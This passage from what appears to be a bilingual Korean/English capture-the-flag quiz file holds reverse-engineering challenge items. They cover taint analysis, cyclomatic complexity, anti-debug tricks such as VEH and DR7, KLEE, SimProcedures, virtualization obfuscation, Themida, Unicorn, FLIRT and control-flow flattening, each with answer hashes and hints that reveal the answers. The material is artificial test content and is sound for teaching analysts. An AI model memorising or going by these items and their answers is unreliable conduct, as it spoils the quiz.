      "ko": "공격자가 제어하는 입력(소스: recv, argv, 파일)에 표식을 붙이고, 그것이 연산을 거쳐 전파되는 것을 추적해 위험한 함수(싱크: memcpy, system, strcpy)까지 도달하는지를 본다. 소스→싱크 데이터 흐름을 쫓는 이 분석의 이름(한 단어)은?",
      "en": "Mark attacker-controlled input (sources: recv, argv, files), track how the mark propagates through operations, and see whether it reaches a dangerous function (sinks: memcpy, system, strcpy). Give the one word for this source-to-sink data-flow analysis."
    },
    "hints": {
      "ko": [
        "얼룩·오염이라는 뜻의 영어 단어.",
        "동적 버전은 DBI(Pin/DynamoRIO) 위에 구현한다."
      ],
      "en": [
        "The English word for a stain or contamination.",
        "The dynamic version is built on DBI (Pin/DynamoRIO)."
      ]
    }
  },
  {
    "id": "t3_recyclomatic",
    "tier": 3,
    "cat": "binary",
    "track": "revadv",
    "points": 200,
    "ci": false,
    "hash": "a18e21382b65a3648b7f8ed80c5915c076693885df247c8450bbcf3f70dc699d",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "분기의 무게",
      "en": "The Weight of the Branches"
    },
    "prompt": {
      "ko": "아래는 한 함수의 제어 흐름 그래프다. 순환 복잡도 M = E − N + 2 (E 는 엣지 수, N 은 노드 수, 연결 요소 1개) 를 계산해 `FLAG{CC_<M>}` 를 제출하라.\n\n```\nnodes: 6\nedges:\nn1 -> n2\nn2 -> n3\nn2 -> n4\nn3 -> n5\nn4 -> n5\nn5 -> n6\nn5 -> n2\n```",
      "en": "Below is a function's control flow graph. Compute the cyclomatic complexity M = E − N + 2 (E edges, N nodes, one connected component) and submit `FLAG{CC_<M>}`.\n\n```\nnodes: 6\nedges:\nn1 -> n2\nn2 -> n3\nn2 -> n4\nn3 -> n5\nn4 -> n5\nn5 -> n6\nn5 -> n2\n```"
    },
    "hints": {
      "ko": [
        "엣지 7 개, 노드 6 개.",
        "7 − 6 + 2."
      ],
      "en": [
        "7 edges, 6 nodes.",
        "7 − 6 + 2."
      ]
    }
  },
  {
    "id": "t4_reveh",
    "tier": 4,
    "cat": "antidbg",
    "track": "revadv",
    "points": 160,
    "ci": true,
    "hash": "005bc5c2e3eda888e9710622372ad53ddfaca6ac6d69d21e043dd1c159bfd1f7",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "내가 먼저 잡는 예외",
      "en": "The Exception I Catch First"
    },
    "prompt": {
      "ko": "예외 기반 안티디버깅. 프로그램이 자기 핸들러를 먼저 등록해 두고 일부러 예외(예: `int 2d`, 잘못된 접근)를 일으킨다. 디버거가 붙어 있으면 디버거가 예외를 먼저 삼켜 핸들러가 호출되지 않는다 — 그 사실로 디버거를 탐지한다. SEH 보다 먼저 불리는 이 핸들러 체계의 세 글자 약어는?",
      "en": "Exception-based anti-debug: the program registers its own handler first, then deliberately raises an exception (e.g. `int 2d`, a bad access). If a debugger is attached it swallows the exception first and the handler never runs — which is how the debugger is detected. Give the three-letter acronym for this handler mechanism that runs before SEH."
    },
    "hints": {
      "ko": [
        "\"Vectored Exception Handler\".",
        "AddVectoredExceptionHandler 로 등록한다."
      ],
      "en": [
        "\"Vectored Exception Handler\".",
        "Registered with AddVectoredExceptionHandler."
      ]
    }
  },
  {
    "id": "t4_redr7",
    "tier": 4,
    "cat": "antidbg",
    "track": "revadv",
    "points": 160,
    "ci": true,
    "hash": "4f6b77ca378b9303b4b597f5e070910f7a3426509fde089c1bd2f43755434ee9",
    "fmt": "한 단어 / one word (3글자 / 3 chars)",
    "title": {
      "ko": "하드웨어 브레이크포인트의 스위치",
      "en": "The Switch for Hardware Breakpoints"
    },
    "prompt": {
      "ko": "CPU 의 디버그 레지스터 중 DR0–DR3 은 하드웨어 브레이크포인트 주소 4 개를 담고, 이 제어 레지스터가 각각의 활성화 여부·조건·길이를 지정한다. 안티디버깅 코드는 이 레지스터가 0 이 아닌지를 검사해 하드웨어 브레이크포인트를 탐지한다. 이 제어 레지스터의 이름은?",
      "en": "Among the CPU debug registers, DR0–DR3 hold four hardware-breakpoint addresses and this control register sets each one's enable bit, condition and length. Anti-debug code checks whether it is non-zero to detect hardware breakpoints. Name that control register."
    },
    "hints": {
      "ko": [
        "DR 다음에 숫자 하나 — DR6 은 상태, 이건 제어.",
        "GetThreadContext 로 읽어 검사한다."
      ],
      "en": [
        "DR followed by one digit — DR6 is status, this is control.",
        "Read and checked via GetThreadContext."
      ]
    }
  },
  {
    "id": "t4_reklee",
    "tier": 4,
    "cat": "symbolic",
    "track": "revadv",
    "points": 160,
    "ci": true,
    "hash": "d588e832322b257a2154fcc67e09f64db3c1c95578607edf20a64443e9e2d928",
    "fmt": "도구 이름 / tool name (4글자 / 4 chars)",
    "title": {
      "ko": "LLVM 비트코드 위의 심볼릭 실행",
      "en": "Symbolic Over LLVM Bitcode"
    },
    "prompt": {
      "ko": "LLVM 비트코드 위에서 동작하는 심볼릭 실행 엔진. 소스가 있는 프로그램을 clang 으로 .bc 로 컴파일한 뒤 모든 경로를 탐색하며 고커버리지 테스트 케이스와 크래시 입력을 자동 생성한다. OSDI 2008 에서 발표된 스탠퍼드 도구의 이름(네 글자)은?",
      "en": "A symbolic-execution engine that runs on LLVM bitcode: compile a source program to .bc with clang, then explore every path to auto-generate high-coverage test cases and crashing inputs. Give the four-letter name of this Stanford tool from OSDI 2008."
    },
    "hints": {
      "ko": [
        "바우하우스 시대 스위스 태생 화가의 성을 대문자로.",
        "coreutils 의 버그를 무더기로 찾아낸 것으로 유명하다."
      ],
      "en": [
        "The surname of a Bauhaus-era Swiss-born painter, in capitals.",
        "Famous for finding a pile of bugs in coreutils."
      ]
    }
  },
  {
    "id": "t4_resimproc",
    "tier": 4,
    "cat": "symbolic",
    "track": "revadv",
    "points": 160,
    "ci": true,
    "hash": "59528e910aa712073ec89af050c3dcd9854949f37aac25d1edd7469ea6888c22",
    "fmt": "한 단어 / one word (12글자 / 12 chars)",
    "title": {
      "ko": "함수를 파이썬 요약으로",
      "en": "A Function as a Python Summary"
    },
    "prompt": {
      "ko": "대표 파이썬 심볼릭 실행 엔진에서, 심볼릭 실행이 라이브러리 함수(strlen, malloc, printf) 안으로 들어가 경로가 폭증하는 것을 막으려고 그 함수를 파이썬으로 쓴 등가 요약으로 통째로 대체한다. 이 대체 객체를 부르는 용어(한 단어, 낙타표기)는?",
      "en": "In the leading Python symbolic-execution engine, to stop symbolic execution from stepping into a library function (strlen, malloc, printf) and blowing up the path count, you replace the whole function with an equivalent summary written in Python. Give the one-word CamelCase term for that replacement object."
    },
    "hints": {
      "ko": [
        "\"Sim\" + \"Procedure\".",
        "수백 개가 엔진에 기본 탑재돼 있고, 모델링된 libc 호출마다 하나씩 있다."
      ],
      "en": [
        "\"Sim\" + \"Procedure\".",
        "Hundreds ship with the engine, one per modeled libc call."
      ]
    }
  },
  {
    "id": "t4_revirt",
    "tier": 4,
    "cat": "unpack",
    "track": "revadv",
    "points": 160,
    "ci": true,
    "hash": "0b7635b2568f0d2eac8368ab3e852fc053475ef98f24b891ef02e9d467229709",
    "fmt": "한 단어 / one word (14글자 / 14 chars)",
    "title": {
      "ko": "기계 안의 기계",
      "en": "A Machine Inside the Machine"
    },
    "prompt": {
      "ko": "VMProtect 류 보호기가 쓰는 가장 무거운 난독화. 원본 x86 코드를 커스텀 바이트코드로 컴파일하고, 바이너리에 심은 인터프리터(디스패처 + 핸들러들)가 그 바이트코드를 실행한다. 분석가는 먼저 그 가상 머신 자체를 리버싱해야 한다. 이 기법을 부르는 한 단어는?",
      "en": "The heaviest obfuscation, used by protectors like VMProtect: compile the original x86 code to a custom bytecode that an embedded interpreter (a dispatcher plus handlers) executes. The analyst must first reverse the virtual machine itself. Give the one word for this technique."
    },
    "hints": {
      "ko": [
        "\"virtual\" 에서 나온 명사, -ization 으로 끝난다.",
        "각 원본 명령은 하나의 핸들러 루틴이 된다."
      ],
      "en": [
        "A noun from \"virtual\", ending -ization.",
        "Each original instruction becomes one handler routine."
      ]
    }
  },
  {
    "id": "t4_rethemida",
    "tier": 4,
    "cat": "unpack",
    "track": "revadv",
    "points": 160,
    "ci": true,
    "hash": "575db00f2d576134a485eebbd99865370d6ef12e26a8743669881cb8dd241a46",
    "fmt": "도구 이름 / tool name (7글자 / 7 chars)",
    "title": {
      "ko": "상용 보호기의 대명사",
      "en": "The Byword for Commercial Protectors"
    },
    "prompt": {
      "ko": "Oreans 가 만든 상용 보호기로, WinLicense 와 짝을 이루며 CISC·FISH·TIGER 등 여러 가상 머신과 겹겹의 안티디버깅·안티덤프 트릭으로 악명 높다. 언패킹 튜토리얼에 가장 자주 등장하는 이 보호기의 이름은?",
      "en": "Oreans' commercial protector, paired with WinLicense, notorious for multiple virtual machines (CISC, FISH, TIGER) and layered anti-debug and anti-dump tricks. The one that shows up most often in unpacking tutorials. Name it."
    },
    "hints": {
      "ko": [
        "그리스 신화의 정의의 여신 Themis 에서 딴 이름.",
        "VMProtect 와 함께 가장 널리 쓰이는 두 상용 보호기 중 하나."
      ],
      "en": [
        "Named after Themis, the Greek goddess of justice.",
        "One of the two most widely used commercial protectors alongside VMProtect."
      ]
    }
  },
  {
    "id": "t4_reunicorn",
    "tier": 4,
    "cat": "binary",
    "track": "revadv",
    "points": 160,
    "ci": true,
    "hash": "c6cb50e7eea0df1fd3eaf52ada2358f5423afd7c0b5ee2395231a9b3208ffcaf",
    "fmt": "도구 이름 / tool name (7글자 / 7 chars)",
    "title": {
      "ko": "CPU 만 떼어 낸 에뮬레이터",
      "en": "Just the CPU, Emulated"
    },
    "prompt": {
      "ko": "QEMU 의 TCG 엔진에서 CPU 에뮬레이터만 떼어 낸 경량 프레임워크. OS 도 디바이스도 없이 원하는 아키텍처의 코드 조각(셸코드, VM 핸들러, 펌웨어 루틴)을 메모리에 올려 한 명령씩 돌리고 훅을 건다. 무지개색 말 이름의 이 프레임워크는?",
      "en": "A lightweight framework that carves just the CPU emulator out of QEMU's TCG engine. With no OS and no devices, you map a chunk of code for any architecture (shellcode, a VM handler, a firmware routine) into memory, run it instruction by instruction and hook it. Named after the rainbow-colored horse."
    },
    "hints": {
      "ko": [
        "Capstone·Keystone 과 같은 팀(Nguyen Anh Quynh)이 만들었다.",
        "\"uni\" + 뿔 달린 말."
      ],
      "en": [
        "Same team as Capstone and Keystone (Nguyen Anh Quynh).",
        "\"uni\" + the horned horse."
      ]
    }
  },
  {
    "id": "t4_reflirt",
    "tier": 4,
    "cat": "binary",
    "track": "revadv",
    "points": 160,
    "ci": true,
    "hash": "8a1c4dba781ac7028b2ef429fd6fc683b51497b75686a14a3a95f7cbe30d7600",
    "fmt": "약어 / acronym (5글자 / 5 chars)",
    "title": {
      "ko": "라이브러리 함수에 이름 붙이기",
      "en": "Naming the Library Functions"
    },
    "prompt": {
      "ko": "정적 링크된 바이너리에서는 libc 의 strcpy·printf 같은 함수가 이름 없이 통째로 박혀 있어 분석을 방해한다. IDA 의 이 시그니처 기술은 각 라이브러리 함수의 첫 바이트 패턴을 미리 만들어 둔 .sig 와 대조해 자동으로 이름을 붙여 준다. 이 기술의 다섯 글자 약어는?",
      "en": "In a statically linked binary, libc functions like strcpy and printf sit inlined with no names, getting in the analyst's way. IDA's signature technology matches each library function's leading byte pattern against prebuilt .sig files and labels them automatically. Give its five-letter acronym."
    },
    "hints": {
      "ko": [
        "\"Fast Library Identification and Recognition Technology\".",
        "Ghidra 의 대응 기능은 Function ID."
      ],
      "en": [
        "\"Fast Library Identification and Recognition Technology\".",
        "Ghidra's equivalent is Function ID."
      ]
    }
  },
  {
    "id": "t4_reflatten",
    "tier": 4,
    "cat": "binary",
    "track": "revadv",
    "points": 160,
    "ci": true,
    "hash": "d7438873944c5d07995176b9853f8c9fb1121714432c7bf498ae4a0c18fcc399",
    "fmt": "한 단어 / one word (-ing으로 끝남 / ends in -ing)",
    "title": {
      "ko": "모든 블록을 한 층으로",
      "en": "Every Block on One Floor"
    },
    "prompt": {
      "ko": "OLLVM 이 제공하는 제어 흐름 난독화. 함수의 모든 기본 블록을 하나의 거대한 switch 문 아래 같은 높이로 펼치고, 상태 변수와 디스패처 루프가 다음에 어느 블록으로 갈지 정하게 만든다. 원래의 중첩된 if/while 구조가 사라진다. 이 기법의 이름(-ing 으로 끝나는 한 단어)은?",
      "en": "A control-flow obfuscation from OLLVM: spread every basic block of a function to the same level under one giant switch, and let a state variable and a dispatcher loop decide which block runs next. The original nested if/while structure disappears. Give the one-word name, ending in -ing."
    },
    "hints": {
      "ko": [
        "평평하게 만든다 — \"flat\" 에서 나온 동명사.",
        "역난독화는 심볼릭 실행으로 상태 변수를 풀어 원래 엣지를 복원한다."
      ],
      "en": [
        "It makes things flat — a gerund from \"flat\".",
        "Deobfuscation recovers the original edges by solving the state variable symbolically."
      ]
    }
  },
  {
    "id": "t4_recapstone",
    "tier": 4,
    "cat": "binary",
    "track": "revadv",
    "points": 250,
    "ci": false,
    "hash": "32e27919373a5cb203cf22ef0961831bafa83db0f2807b46b000e0c5d2ae2b57",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "분석 브리핑",
      "en": "The Analysis Brief"
    },
    "prompt": {
      "ko": "한 의심 함수에 대한 자동 분석 결과다. 아래 브리핑에서 세 값을 뽑아라: 순환 복잡도 m = E − N + 2, 발견된 안티디버깅 API 수 k, 그리고 섹션 무작위도 점수가 7.2 이상이면 `PACKED` 아니면 `CLEAN`. `FLAG{M<m>_K<k>_<PACKED|CLEAN>}` 를 제출하라.\n\n```\ncfg_nodes: 9\ncfg_edges:\na -> b\nb -> c\nb -> d\nc -> e\nd -> e\ne -> f\nf -> g\ng -> h\nh -> i\ni -> f\ne -> b\nf -> c\nantidbg_apis: CheckRemoteDebuggerPresent, NtQueryInformationProcess, OutputDebugString\nrandomness: 7.6\n```",
      "en": "An automated analysis of one suspicious function. Pull three values from the brief below: cyclomatic complexity m = E − N + 2, the count k of anti-debug APIs found, and `PACKED` if the section randomness score is 7.2 or above else `CLEAN`. Submit `FLAG{M<m>_K<k>_<PACKED|CLEAN>}`.\n\n```\ncfg_nodes: 9\ncfg_edges:\na -> b\nb -> c\nb -> d\nc -> e\nd -> e\ne -> f\nf -> g\ng -> h\nh -> i\ni -> f\ne -> b\nf -> c\nantidbg_apis: CheckRemoteDebuggerPresent, NtQueryInformationProcess, OutputDebugString\nrandomness: 7.6\n```"
    },
    "hints": {
      "ko": [
        "엣지 12, 노드 9 → m = 5. API 3 개.",
        "7.6 ≥ 7.2 이므로 PACKED."
      ],
      "en": [
        "12 edges, 9 nodes → m = 5; three APIs.",
        "7.6 ≥ 7.2 so PACKED."
      ]
    }
  }
];
